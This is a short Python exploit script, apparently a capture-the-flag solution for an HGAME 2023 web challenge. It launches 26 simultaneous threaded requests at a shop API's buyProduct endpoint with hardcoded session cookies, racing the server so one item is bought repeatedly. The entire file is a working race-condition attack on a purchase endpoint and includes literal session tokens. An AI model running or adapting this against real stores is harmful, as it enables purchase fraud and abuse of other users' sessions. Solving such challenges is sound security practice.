# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2023/01/25 21:21:42
@Author  :   zeroc 
'''
import requests
import threading

url = "http://week-3.hgame.lwsec.cn:32682/api/v1/user/buyProduct?product=Apple&number=1"
header = {"Cookie": "_ga_P1E9Z5LRRK=GS1.1.1674115166.3.1.1674116476.0.0.0; _ga=GA1.1.974286945.1673524951; SESSION=MTY3NDUzNjkyM3xEdi1CQkFFQ180SUFBUkFCRUFBQUlfLUNBQUVHYzNSeWFXNW5EQVlBQkhWelpYSUdjM1J5YVc1bkRBY0FCV0ZrYldsdXwdO1N3uO8TqwG27jFlAT_2dcvIR7IHHiqg7TMMWFqb9A==; session=MTY3NDY1Mjk4MHxEdi1CQkFFQ180SUFBUkFCRUFBQUpmLUNBQUVHYzNSeWFXNW5EQW9BQ0hWelpYSnVZVzFsQm5OMGNtbHVad3dGQUFOb2FHZz18c8qvBEgZBeZ_0yRq--JhUBFYmSYCOgGVoLND03v3RWE="}

def buy():
    requests.get(url, headers=header)

ts = []

for i in range(0, 26):
    exec('t{} = threading.Thread(target=buy)'.format(i))
    exec('ts.append(t{})'.format(i))
for s in ts:
    s.start()
print("DONE")